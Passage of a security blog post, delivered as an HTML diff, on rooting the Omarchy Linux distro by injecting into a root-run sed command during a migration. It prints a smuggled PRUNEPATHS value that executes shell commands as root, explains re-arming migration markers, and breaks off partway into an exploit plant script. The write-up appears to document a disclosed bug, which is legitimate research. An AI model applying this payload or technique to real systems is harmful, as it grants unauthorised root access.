@@ -1,0 +1,286 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="kernels / networking / offensive security / nix btw / nvim btw"><meta name="theme-color" content="#000000"><link rel="canonical" href="https://wasdhjkl.xyz/blog/rooting-omarchy-with-four-bytes/"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="crossorigin"><link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300..700&#38;display=swap" rel="stylesheet"><style>.highlight .hll { background-color: #6e7681 }
+.highlight { background: transparent; color: #D4D2C8 }
+.highlight .c { color: #7E8AA1 } /* Comment */
+.highlight .err { color: #F88F7F } /* Error */
+.highlight .esc { color: #D4D2C8 } /* Escape */
+.highlight .g { color: #D4D2C8 } /* Generic */
+.highlight .k { color: #FFAD66 } /* Keyword */
+.highlight .l { color: #D5FF80 } /* Literal */
+.highlight .n { color: #D4D2C8 } /* Name */
+.highlight .o { color: #FFAD66 } /* Operator */
+.highlight .x { color: #D4D2C8 } /* Other */
+.highlight .p { color: #D4D2C8 } /* Punctuation */
+.highlight .ch { color: #F88F7F; font-style: italic } /* Comment.Hashbang */
+.highlight .cm { color: #7E8AA1 } /* Comment.Multiline */
+.highlight .cp { color: #FFAD66; font-weight: bold } /* Comment.Preproc */
+.highlight .cpf { color: #7E8AA1 } /* Comment.PreprocFile */
+.highlight .c1 { color: #7E8AA1 } /* Comment.Single */
+.highlight .cs { color: #7E8AA1; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #F88F7F; background-color: #3D1E20 } /* Generic.Deleted */
+.highlight .ge { color: #D4D2C8; font-style: italic } /* Generic.Emph */
+.highlight .ges { color: #D4D2C8 } /* Generic.EmphStrong */
+.highlight .gr { color: #F88F7F } /* Generic.Error */
+.highlight .gh { color: #D4D2C8 } /* Generic.Heading */
+.highlight .gi { color: #6AD4AF; background-color: #19362C } /* Generic.Inserted */
+.highlight .go { color: #7E8AA1 } /* Generic.Output */
+.highlight .gp { color: #D4D2C8 } /* Generic.Prompt */
+.highlight .gs { color: #D4D2C8; font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #D4D2C8 } /* Generic.Subheading */
+.highlight .gt { color: #F88F7F } /* Generic.Traceback */
+.highlight .kc { color: #FFAD66 } /* Keyword.Constant */
+.highlight .kd { color: #FFAD66 } /* Keyword.Declaration */
+.highlight .kn { color: #FFAD66 } /* Keyword.Namespace */
+.highlight .kp { color: #FFAD66 } /* Keyword.Pseudo */
+.highlight .kr { color: #FFAD66 } /* Keyword.Reserved */
+.highlight .kt { color: #73D0FF } /* Keyword.Type */
+.highlight .ld { color: #D5FF80 } /* Literal.Date */
+.highlight .m { color: #DFBFFF } /* Literal.Number */
+.highlight .s { color: #D5FF80 } /* Literal.String */
+.highlight .na { color: #FFD173 } /* Name.Attribute */
+.highlight .nb { color: #FFD173 } /* Name.Builtin */
+.highlight .nc { color: #73D0FF } /* Name.Class */
+.highlight .no { color: #FFD173 } /* Name.Constant */
+.highlight .nd { color: #7E8AA1; font-weight: bold; font-style: italic } /* Name.Decorator */
+.highlight .ni { color: #95E6CB } /* Name.Entity */
+.highlight .ne { color: #73D0FF } /* Name.Exception */
+.highlight .nf { color: #FFD173 } /* Name.Function */
+.highlight .nl { color: #D4D2C8 } /* Name.Label */
+.highlight .nn { color: #D4D2C8 } /* Name.Namespace */
+.highlight .nx { color: #D4D2C8 } /* Name.Other */
+.highlight .py { color: #FFD173 } /* Name.Property */
+.highlight .nt { color: #5CCFE6 } /* Name.Tag */
+.highlight .nv { color: #D4D2C8 } /* Name.Variable */
+.highlight .ow { color: #FFAD66 } /* Operator.Word */
+.highlight .pm { color: #D4D2C8 } /* Punctuation.Marker */
+.highlight .w { color: #D4D2C8 } /* Text.Whitespace */
+.highlight .mb { color: #DFBFFF } /* Literal.Number.Bin */
+.highlight .mf { color: #DFBFFF } /* Literal.Number.Float */
+.highlight .mh { color: #DFBFFF } /* Literal.Number.Hex */
+.highlight .mi { color: #DFBFFF } /* Literal.Number.Integer */
+.highlight .mo { color: #DFBFFF } /* Literal.Number.Oct */
+.highlight .sa { color: #F29E74 } /* Literal.String.Affix */
+.highlight .sb { color: #D5FF80 } /* Literal.String.Backtick */
+.highlight .sc { color: #D5FF80 } /* Literal.String.Char */
+.highlight .dl { color: #D5FF80 } /* Literal.String.Delimiter */
+.highlight .sd { color: #7E8AA1 } /* Literal.String.Doc */
+.highlight .s2 { color: #D5FF80 } /* Literal.String.Double */
+.highlight .se { color: #95E6CB } /* Literal.String.Escape */
+.highlight .sh { color: #D5FF80 } /* Literal.String.Heredoc */
+.highlight .si { color: #95E6CB } /* Literal.String.Interpol */
+.highlight .sx { color: #95E6CB } /* Literal.String.Other */
+.highlight .sr { color: #95E6CB } /* Literal.String.Regex */
+.highlight .s1 { color: #D5FF80 } /* Literal.String.Single */
+.highlight .ss { color: #DFBFFF } /* Literal.String.Symbol */
+.highlight .bp { color: #5CCFE6 } /* Name.Builtin.Pseudo */
+.highlight .fm { color: #FFD173 } /* Name.Function.Magic */
+.highlight .vc { color: #D4D2C8 } /* Name.Variable.Class */
+.highlight .vg { color: #D4D2C8 } /* Name.Variable.Global */
+.highlight .vi { color: #D4D2C8 } /* Name.Variable.Instance */
+.highlight .vm { color: #D4D2C8 } /* Name.Variable.Magic */
+.highlight .il { color: #DFBFFF } /* Literal.Number.Integer.Long */
+*{box-sizing:border-box;}body{margin:0 auto;padding:1.5rem 1rem 1.5rem;background:#000000;color:#bebebe;font-family:"Space Grotesk";overflow-x:hidden;font-size:1.15rem;line-height:1.6;max-width:64rem;}a{color:#7e8aa1;text-decoration:underline;}a:hover{color:#8e9ab1;text-decoration:underline;}img{image-rendering:auto;max-width:100%;margin-bottom:1.5rem;}nav{display:flex;margin-bottom:1rem;padding-bottom:0.5rem;border-bottom:1px solid #1d1d1d;}nav .art{color:#bebebe;font-size:1px;margin:0;text-decoration:none;align-self:flex-end;}.links{align-self:flex-end;margin-left:0.5rem;}.links span{font-weight:600;margin-bottom:0.5rem;}.links a{margin-right:0.5rem;font-size:1rem;display:flex;color:#5e5e5e;text-align:left;text-decoration:none;letter-spacing:0.05rem;flex-direction:column;line-height:1;font-weight:400;}.links a:hover{color:#5e5e5e;text-decoration:underline;}.links div{display:flex;}.art{display:block;width:max-content;max-width:100%;margin:0 auto;white-space:pre;font-size:clamp(1px, 2vw, 4px);line-height:0.85;overflow:hidden;}big{text-align:center;display:block;margin:0.5rem 0 0;font-size:1.65rem;font-weight:600;letter-spacing:0.05rem;}small{margin:0.25rem 0 0.25rem;display:block;text-align:center;font-size:1rem;color:#5e5e5e;}h1{margin:0;font-size:1.65rem;font-weight:600;}h2{margin:0 0 0.25rem;font-size:1.65rem;position:relative;font-weight:600;}h3, h4{margin:0 0 0.25rem;font-size:1.4rem;position:relative;font-weight:600;}h2 a, h3 a, h4 a{color:inherit;text-decoration:none;}h2 a::after, h3 a::after, h4 a::after{content:"§ ";color:#cecece;position:absolute;left:-1.2rem;opacity:0;}h2 a:hover, h3 a:hover, h4 a:hover{text-decoration:underline;color:#cecece;}h2 a:hover::after, h3 a:hover::after, h4 a:hover::after{opacity:1;}p{margin:0 0 1.5rem;}ul{margin:0 1rem 1.5rem;padding-left:1rem;}ul ul{margin-bottom:0;}blockquote{color:#9e9e9e;margin-left:1rem;padding:0 1rem 0;border-left:0.25rem solid #1d1d1d;}code{color:#7e8aa1;border:1px solid #1d1d1d;}.figure{display:flex;justify-content:center;}.caption{display:none;}#blog p{margin:0;}#blog .blog-list-end{margin:0 0 1rem;}.highlight{margin:0 0 1.5rem;background:transparent;overflow-x:auto;border:1px solid #1d1d1d;}.highlight pre{margin:0 auto 0;line-height:1.25;color:#5e5e5e;padding:0.5rem;}time{color:#5e5e5e;white-space:nowrap;}.new{color:#f88f7f;font-size:1rem;}.buttons-border{border-bottom:1px solid #1d1d1d;}.buttons{display:flex;flex-wrap:wrap;margin:0 auto;justify-content:center;gap:0.5rem;margin-top:1rem;max-width:60%;}.buttons + .buttons{border-top:none;margin-top:0.5rem;padding-top:0.5rem;}.buttons img{image-rendering:pixelated;display:block;margin-bottom:0;width:88px;height:31px;border:0;}.buttons a{line-height:0;}@media (max-width: 680px){.buttons{max-width:100%;}}#contact p{margin-bottom:0.5rem;}footer{margin-top:1rem;padding-top:0.5rem;border-top:1px solid #1d1d1d;text-align:center;font-size:0.75rem;color:#5e5e5e;}footer a{color:#5e5e5e;text-decoration:none;}footer a:hover{color:#5e5e5e;}footer .sep{margin:0 0.1rem;}</style><title>rooting-omarchy-with-four-bytes</title></head><nav><div class="links"><span>wasdhjkl.xyz</span><div><a href="/#about">about</a><a href="/#blog">blog</a><a href="/#contact">contact</a></div></div></nav><section id="rooting-omarchy-with-four-bytes">
+<h1 id="rooting-omarchy-with-four-bytes">Rooting Omarchy With Four Bytes</h1>
+<p>
+ <time datetime="2026-09-07">Sep, 7 2026</time></p>
+<h2 id="contents"><a href="#contents">Contents</a></h2>
+<ul>
+ <li><a href="#intro">Intro</a></li>
+ <li><a href="#recon">Recon</a>
+  <ul>
+   <li><a href="#where-the-omarchy-code-actually-lives">Where the Omarchy code actually lives</a></li>
+   <li><a href="#the-ai-slop-bins">The AI-slop bins</a></li></ul></li>
+ <li><a href="#the-dead-ends">The Dead Ends</a>
+  <ul>
+   <li><a href="#launch-or-focus-rce-as-myself">launch-or-focus: RCE as myself</a></li>
+   <li><a href="#webapp-custom-exec">webapp custom exec</a></li>
+   <li><a href="#dev-link-and-the-secure-path-it-hands-you">dev-link and the secure_path it hands you</a></li></ul></li>
+ <li><a href="#the-installer">The Installer</a>
+  <ul>
+   <li><a href="#locate-sh">locate.sh</a></li>
+   <li><a href="#defect-1-you-pick-the-file-root-reads">Defect 1: you pick the file root reads</a></li>
+   <li><a href="#defect-2-unquoted-into-a-root-sed-program">Defect 2: unquoted into a root sed program</a></li>
+   <li><a href="#why-the-filter-fails">Why the filter fails</a></li></ul></li>
+ <li><a href="#getting-it-to-fire">Getting It to Fire</a></li>
+ <li><a href="#root">Root</a></li>
+ <li><a href="#disclosure">Disclosure</a></li>
+ <li><a href="#the-fix">The Fix</a></li></ul>
+<h2 id="intro"><a href="#intro">Intro</a></h2>
+<p>For context: <a href="https://omarchy.org">Omarchy</a> is an Arch-based distro, maxed out with skid brainrot levels ricing that makes you laugh, and is I think almost entirely vibe coded.</p>
+<p>People were finding vulns left and riht and I felt a little fomo&hellip; so before I get into it, heres the thesis:</p>
+<blockquote>
+ <p>The bug wasn&rsquo;t exotic. An unprivileged file&rsquo;s contents get spliced, unquoted, into a <code>sed</code> program that runs as root during a routine update. The only &ldquo;clever&rdquo; part is a GNU <code>sed</code> escape that walks straight through the filter that&rsquo;s supposed to stop it.</p></blockquote>
+<h2 id="recon"><a href="#recon">Recon</a></h2>
+<p>Headed to omarchy.org and downloaded the iso&hellip; WHICH WAS 5 POINT 8 FKING GB BTW.</p>
+<p>Booted it and it dropped me onto a plain Arch boot screen. Kinda funny considering how much branding they do.</p>
+<p>First thing I check is setuid binaries.</p>
+<div class="highlight"><pre><span></span>find<span class="w"> </span>/<span class="w"> </span>-xdev<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-ls<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</pre></div>
+<p>Nothing spicy. <code>sudo</code>, <code>su</code>, <code>pkexec</code>, the usual crowd. No Omarchy-added setuid anywhere. So its gonna have to be in the <em>Omarchy configs/scripts</em>.</p>
+<h3 id="where-the-omarchy-code-actually-lives"><a href="#where-the-omarchy-code-actually-lives">Where the Omarchy code actually lives</a></h3>
+<p><code>omarchy-shell.sh</code> refused to run without <code>OMARCHY_PATH</code> set, which was a nice hint.</p>
+<div class="highlight"><pre><span></span><span class="nb">echo</span><span class="w"> </span><span class="nv">$OMARCHY_PATH</span>
+<span class="c1"># /usr/share/omarchy</span>
+</pre></div>
+<p>That directory is basically what they got on git. Every Omarchy-specific script lives here and it&rsquo;s all on PATH. If I want an <em>Omarchy</em> vuln and not a generic Arch one, this is the folder.</p>
+<blockquote>
+ <p>Open ports by default were just dns/mdns noise plus a couple of IPP printer ports. Printers are famously fucky, but that&rsquo;s cups, not Omarchy (also Omarchy hardened cups-browsed 4 days before I was looking at all this)</p></blockquote>
+<h3 id="the-ai-slop-bins"><a href="#the-ai-slop-bins">The AI-slop bins</a></h3>
+<p>The <code>bin/</code> scripts are where the Omarchy-specific logic is, and a lot of it reads as AI generated. So I did the dumb effective thing:</p>
+<div class="highlight"><pre><span></span><span class="nb">cd</span><span class="w"> </span>bin
+find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-exec<span class="w"> </span>shellcheck<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span>&gt;&gt;shellcheck<span class="w"> </span><span class="se">\;</span>
+</pre></div>
+<p>I skimmed the whole pile of warnings looking for the classic shapes: unquoted expansions near <code>eval</code>, <code>exec</code>, command substitution, anything root-adjacent.</p>
+<h2 id="the-dead-ends"><a href="#the-dead-ends">The Dead Ends</a></h2>
+<p>Before the good one, here were some of the leads I chased:</p>
+<h3 id="launch-or-focus-rce-as-myself"><a href="#launch-or-focus-rce-as-myself">launch-or-focus: RCE as myself</a></h3>
+<p><code>bin/omarchy-launch-or-focus</code> has an unquoted <code>eval exec</code> at the bottom:</p>
+<div class="highlight"><pre><span></span><span class="nv">WINDOW_PATTERN</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
+<span class="nv">LAUNCH_COMMAND</span><span class="o">=</span><span class="s2">"</span><span class="si">${</span><span class="nv">2</span><span class="k">:-</span><span class="s2">"uwsm-app -- </span><span class="nv">$WINDOW_PATTERN</span><span class="s2">"</span><span class="si">}</span><span class="s2">"</span>
+<span class="nv">WINDOW_ADDRESS</span><span class="o">=</span><span class="k">$(</span>hyprctl<span class="w"> </span>clients<span class="w"> </span>-j<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>-r<span class="w"> </span>--arg<span class="w"> </span>p<span class="w"> </span><span class="s2">"</span><span class="nv">$WINDOW_PATTERN</span><span class="s2">"</span><span class="w"> </span><span class="s1">'...|.address'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-n1<span class="k">)</span>
+
+<span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-n<span class="w"> </span><span class="nv">$WINDOW_ADDRESS</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">  </span>hyprctl<span class="w"> </span>dispatch<span class="w"> </span><span class="s2">"hl.dsp.focus(...)"</span><span class="w"> </span>...
+<span class="k">else</span>
+<span class="w">  </span><span class="nb">eval</span><span class="w"> </span><span class="nb">exec</span><span class="w"> </span>setsid<span class="w"> </span><span class="nv">$LAUNCH_COMMAND</span>
+<span class="k">fi</span>
+</pre></div>
+<p>You control <code>$2</code>, so <code>eval exec setsid $LAUNCH_COMMAND</code> will run whatever you hand it. To reach the <code>else</code> you just need <code>WINDOW_ADDRESS</code> empty, which means picking a window pattern that matches nothing. Trivially scriptable.</p>
+<p>So it runs arbitrary commands&hellip; as <em>me</em>. I invoked the command, I passed the argument, I got a shell as the same uid I started with. No boundary broken. Moving on.</p>
+<h3 id="webapp-custom-exec"><a href="#webapp-custom-exec">webapp custom exec</a></h3>
+<p><code>bin/omarchy-webapp-install</code> looked more promising because it <em>writes</em> things. The default <code>Exec</code> line is escaped:</p>
+<div class="highlight"><pre><span></span>desktop_exec_arg<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">  </span><span class="nv">escaped</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">'%s'</span><span class="w"> </span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-e<span class="w"> </span><span class="s1">'s/\\/\\\\/g'</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">'s/"/\\"/g'</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">'s/`/\\`/g'</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">'s/\$/\\$/g'</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">'s/%/%%/g'</span><span class="k">)</span>
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'"%s"'</span><span class="w"> </span><span class="s2">"</span><span class="nv">$escaped</span><span class="s2">"</span>
+<span class="o">}</span>
+</pre></div>
+<p>Someone has def been through this and added the escaping eyesore. However, a comment elsewhere tells us about <code>CUSTOM_EXEC</code>, the 4th argument, which skips <code>desktop_exec_arg</code> entirely:</p>
+<div class="highlight"><pre><span></span><span class="c1"># Default Exec quotes the URL as one Exec-spec argument; the whole line then gets</span>
+<span class="c1"># the file-syntax escaping below (unescaped first at read time per spec, so the</span>
+<span class="c1"># layers compose). $CUSTOM_EXEC is a full command line, so it gets file-syntax only.</span>
+<span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-n<span class="w"> </span><span class="nv">$CUSTOM_EXEC</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">  </span><span class="nv">EXEC_COMMAND</span><span class="o">=</span><span class="nv">$CUSTOM_EXEC</span>
+<span class="k">else</span>
+<span class="w">  </span><span class="nv">EXEC_COMMAND</span><span class="o">=</span><span class="s2">"omarchy-launch-webapp </span><span class="k">$(</span>desktop_exec_arg<span class="w"> </span><span class="s2">"</span><span class="nv">$APP_URL</span><span class="s2">"</span><span class="k">)</span><span class="s2">"</span>
+<span class="k">fi</span>
+</pre></div>
+<p>So if anything calls <code>omarchy-webapp-install</code> <em>non-interactively</em> with a 4th arg built from attacker data, that&rsquo;s the jump.</p>
+<p>So I grepped for a caller&hellip;</p>
+<div class="figure"><img src="install-webapp-grep.png" alt="grepping for 4th arg to webapp-install">
+ <p class="caption">grepping for 4th arg to webapp-install</p></div>
+<p><code>omarchy-install-service-sunshine</code> sets a 4th arg! &hellip;but to a hardcoded constant.</p>
+<div class="highlight"><pre><span></span><span class="nv">SUNSHINE_ADMIN_EXEC</span><span class="o">=</span><span class="s2">"omarchy-launch-webapp </span><span class="nv">$SUNSHINE_ADMIN_URL</span><span class="s2"> --ignore-certificate-errors"</span>
+</pre></div>
+<p>Rip.</p>
+<h3 id="dev-link-and-the-secure-path-it-hands-you"><a href="#dev-link-and-the-secure-path-it-hands-you">dev-link and the secure_path it hands you</a></h3>
+<p>I thought this was the one for a minute. <code>omarchy-dev-link</code> points Omarchy at a local checkout, and to do that it rewrites root&rsquo;s <code>secure_path</code>:</p>
+<div class="highlight"><pre><span></span><span class="nv">target</span><span class="o">=</span><span class="k">$(</span>realpath<span class="w"> </span>-e<span class="w"> </span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="k">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">{</span>
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Error: path does not exist: </span><span class="nv">$1</span><span class="s2">"</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+<span class="w">  </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
+<span class="o">}</span>
+<span class="c1"># ...</span>
+<span class="o">{</span>
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'Defaults secure_path='</span>
+<span class="w">  </span>sudoers_quote<span class="w"> </span><span class="s2">"</span><span class="nv">$target</span><span class="s2">/bin:</span><span class="nv">$system_secure_path</span><span class="s2">"</span>
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'\n'</span>
+<span class="o">}</span><span class="w"> </span>&gt;<span class="s2">"</span><span class="nv">$staged_sudoers</span><span class="s2">"</span>
+<span class="c1"># ...</span>
+sudo<span class="w"> </span>install<span class="w"> </span>-Dm440<span class="w"> </span>-o<span class="w"> </span>root<span class="w"> </span>-g<span class="w"> </span>root<span class="w"> </span><span class="s2">"</span><span class="nv">$staged_sudoers</span><span class="s2">"</span><span class="w"> </span><span class="s2">"</span><span class="nv">$sudoers_file</span><span class="s2">"</span>
+</pre></div>
+<p>It prepends <code>$target/bin</code>, a directory you pass as <code>$1</code>, to the PATH that <em>every <code>sudo</code> command on the box resolves against</em>.</p>
+<p>So in principle: drop a file named <code>systemctl</code> in <code>$target/bin</code>, and the next <code>sudo systemctl restart foo</code> anyone types runs <em>your</em> script as root.</p>
+<p>Their justification for this:</p>
+<div class="highlight"><pre><span></span><span class="c1"># sudo resolves a bare command name against secure_path, never the caller's</span>
+<span class="c1"># PATH, so a dev-linked checkout is invisible to `sudo omarchy-*`: a command the</span>
+<span class="c1"># package does not ship yet fails outright, and one it does ship silently runs</span>
+<span class="c1"># the packaged copy while every unprivileged call runs the checkout. Prepending</span>
+<span class="c1"># the checkout's bin keeps root on the code being edited — the same trust the</span>
+<span class="c1"># link already extends to every system script Omarchy runs out of $OMARCHY_PATH.</span>
+</pre></div>
+<blockquote>
+ <p>They say the checkout gets &ldquo;the same trust the link already extends to every system script Omarchy runs out of <code>OMARCHY_PATH</code>.&rdquo;</p>
+ <p>Bro..</p>
+ <p><code>OMARCHY_PATH</code> scopes to Omarchy&rsquo;s own tree. <code>secure_path</code> is the <strong>global root</strong> PATH for the <strong>entire system</strong>. Equating those two is how you end up prepending a user-writable dir to root&rsquo;s PATH and calling it a feature.</p></blockquote>
+<p>But on a default install, <code>OMARCHY_PATH</code> and its tree are root-owned, not user-writable. The dev-link path only bites if you install Omarchy from a checkout you already control, at which point you were already root during install :/</p>
+<h2 id="the-installer"><a href="#the-installer">The Installer</a></h2>
+<p>Getting a little bored, I wanted to look at stuff that ran on a stock VM <em>without me choosing to run it</em>, which led me to the installer and migration scripts.</p>
+<h3 id="locate-sh"><a href="#locate-sh">locate.sh</a></h3>
+<p><code>install/config/locate.sh</code>, the thing that configures <code>plocate</code>&rsquo;s <code>updatedb</code>. First line:</p>
+<div class="highlight"><pre><span></span><span class="nv">UPDATEDB_CONF_PATH</span><span class="o">=</span><span class="s2">"</span><span class="si">${</span><span class="nv">OMARCHY_UPDATEDB_CONF_PATH</span><span class="k">:-</span><span class="p">/etc/updatedb.conf</span><span class="si">}</span><span class="s2">"</span>
+</pre></div>
+<p>An environment variable decides which file this script reads. And then the same script <em>rewrites</em> that file with <code>sed</code>:</p>
+<div class="highlight"><pre><span></span><span class="c1"># 25:</span>
+<span class="nv">pruned</span><span class="o">=</span><span class="k">$(</span>sed<span class="w"> </span>-nE<span class="w"> </span><span class="s1">'s|^[[:space:]]*PRUNEPATHS[[:space:]]*=[[:space:]]*"([^"]*)".*|\1|p'</span><span class="w"> </span><span class="s2">"</span><span class="nv">$UPDATEDB_CONF_PATH</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-n<span class="w"> </span><span class="m">1</span><span class="k">)</span>
+<span class="c1"># 28:</span>
+sed<span class="w"> </span>-i<span class="w"> </span>-E<span class="w"> </span><span class="s2">"s|^[[:space:]]*PRUNEPATHS[[:space:]]*=.*|PRUNEPATHS = \"/.snapshots</span><span class="si">${</span><span class="nv">pruned</span><span class="p">:+ </span><span class="nv">$pruned</span><span class="si">}</span><span class="s2">\"|"</span><span class="w"> </span><span class="s2">"</span><span class="nv">$UPDATEDB_CONF_PATH</span><span class="s2">"</span>
+</pre></div>
+<p>Look at line 28, <code>$pruned</code>, a value pulled out of the config file, is dropped <em>unquoted</em> into the replacement half of a <code>sed</code> program. And this whole script runs as root during a migration.</p>
+<p>Two things have to be true for that to be exploitable:</p>
+<h3 id="defect-1-you-pick-the-file-root-reads"><a href="#defect-1-you-pick-the-file-root-reads">Defect 1: You pick the file root reads</a></h3>
+<p><code>OMARCHY_UPDATEDB_CONF_PATH</code> is an env var. Unprivileged processes can set env vars. The only question is whether it survives the trip into the root context.</p>
+<p>Well, the migration that calls this script <strong>hands it over on purpose</strong>!</p>
+<div class="highlight"><pre><span></span><span class="c1"># migrations/1784809451.sh</span>
+<span class="c1"># 5:</span>
+<span class="nv">UPDATEDB_CONF_PATH</span><span class="o">=</span><span class="s2">"</span><span class="si">${</span><span class="nv">OMARCHY_UPDATEDB_CONF_PATH</span><span class="k">:-</span><span class="p">/etc/updatedb.conf</span><span class="si">}</span><span class="s2">"</span>
+<span class="c1"># 23:</span>
+as_root<span class="w"> </span>env<span class="w"> </span><span class="nv">OMARCHY_UPDATEDB_CONF_PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$UPDATEDB_CONF_PATH</span><span class="s2">"</span><span class="w"> </span>bash<span class="w"> </span>-euo<span class="w"> </span>pipefail<span class="w"> </span><span class="s2">"</span><span class="nv">$locate_config_script</span><span class="s2">"</span>
+</pre></div>
+<p><code>as_root</code> is <code>sudo</code> when you&rsquo;re not already root. So the migration explicitly forwards my attacker-controlled env var across the privilege boundary and uses it to tell root which file to read and rewrite.</p>
+<h3 id="defect-2-unquoted-into-a-root-sed-program"><a href="#defect-2-unquoted-into-a-root-sed-program">Defect 2: Unquoted into a root sed program</a></h3>
+<p>Now I control the file, which means I control <code>$pruned</code>, which means I control a string that gets spliced raw into a <code>sed</code> command running as root.</p>
+<p><code>sed</code> is a tiny language, and two of its features are all I need:</p>
+<ul>
+ <li>The <code>e</code> flag on an <code>s</code> command: <strong>execute the pattern space as a shell command</strong>  (via <code>/bin/sh</code>). This is a real, documented GNU <code>sed</code> feature and it is exactly  as scary as it sounds.</li>
+ <li>The <code>w &lt;file&gt;</code> flag: write the pattern space to a file. I only need this to eat  the leftover characters of the original program so the whole thing still parses.</li></ul>
+<p>My <code>PRUNEPATHS</code> value (the thing that becomes <code>$pruned</code>):</p>
+<div class="highlight"><pre><span></span><span class="nv">PRUNEPATHS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"\x22;id &gt; /home/uiop/proof.txt;:|ew "</span>
+</pre></div>
+<p>When that gets substituted into the template, the <code>sed</code> program root hands the pattern space,</p>
+<div class="highlight"><pre><span></span><span class="nv">PRUNEPATHS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"/.snapshots "</span><span class="p">;</span>id<span class="w"> </span>&gt;<span class="w"> </span>/home/uiop/proof.txt<span class="p">;</span>:
+</pre></div>
+<p>to <code>/bin/sh</code> <strong>as root</strong>. <code>PRUNEPATHS = "..."</code> fails (command not found, who cares), then <code>id &gt; proof.txt</code> runs, then <code>:</code> is a no-op to end cleanly. And because root ran it, <code>proof.txt</code> comes out owned by root, containing <code>uid=0</code>!</p>
+<h3 id="why-the-filter-fails"><a href="#why-the-filter-fails">Why the filter fails</a></h3>
+<p>You&rsquo;re looking at line 25 thinking: the extraction regex is <code>([^"]*)</code>, it literally can&rsquo;t capture a quote, so how does a <code>"</code> end up closing the string in the command that <code>sh</code> eventually runs???</p>
+<p>Simply put, the quote isn&rsquo;t in the file. The four bytes <code>\x22</code> are. At <em>extraction</em> time (line 25) the value is the literal text <code>\x22</code>, no quote, so <code>[^"]*</code> is perfectly happy and passes it through.</p>
+<p>Then line 28 drops that text into a <code>sed</code> <strong>replacement</strong> string, and GNU <code>sed</code> decodes <code>\xHH</code> escapes in replacements into their byte <em>at program-compile time</em>, after the filter already ran, inside the program that&rsquo;s about to execute. <code>\x22</code> becomes a real <code>"</code>. The filter and the decode happen at two different times, and the escape smuggles the quote across the gap between them B)</p>
+<h2 id="getting-it-to-fire"><a href="#getting-it-to-fire">Getting It to Fire</a></h2>
+<p>Having the primitive is nice. You still need root to <em>run</em> the migration. Two more facts make that easy.</p>
+<p><strong>The migration markers are mine.</strong> Omarchy tracks which migrations have run in <code>~/.local/state/omarchy/migrations/</code>, a directory I own. Delete the marker for <code>1784809451.sh</code> and it&rsquo;s &ldquo;pending&rdquo; again. (The state dir path is even env-overridable via <code>OMARCHY_MIGRATION_STATE</code>, but I didn&rsquo;t need that.) So I can re-arm an already-applied migration whenever I want. That same fact means an attacker can also <em>suppress</em> a security-repair migration by pre-touching its marker, which is its own problem.</p>
+<p><strong>Omarchy nags you to run migrations.</strong> At login, <code>omarchy-migrate-notify</code> throws a <em>critical</em> &ldquo;Pending Omarchy Migrations&rdquo; desktop notification whose button opens a terminal and runs <code>omarchy-migrate</code>. Clicking it is the exact thing Omarchy is designed for you to do. And <code>omarchy update</code> runs <code>omarchy-migrate</code> on its own, right after <code>pacman -Syu</code>, which already warmed your <code>sudo</code> timestamp, so no second password prompt appears when my migration escalates.</p>
+<p>So the full unprivileged plant is tiny:</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
+<span class="nb">set</span><span class="w"> </span>-eu
+<span class="nv">DIR</span><span class="o">=</span><span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/lpe"</span><span class="p">;</span><span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="s2">"</span><span class="nv">$DIR</span><span class="s2">"</span>
+<span class="o">{</span>
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'PRUNE_BIND_MOUNTS = "no"\n'</span>
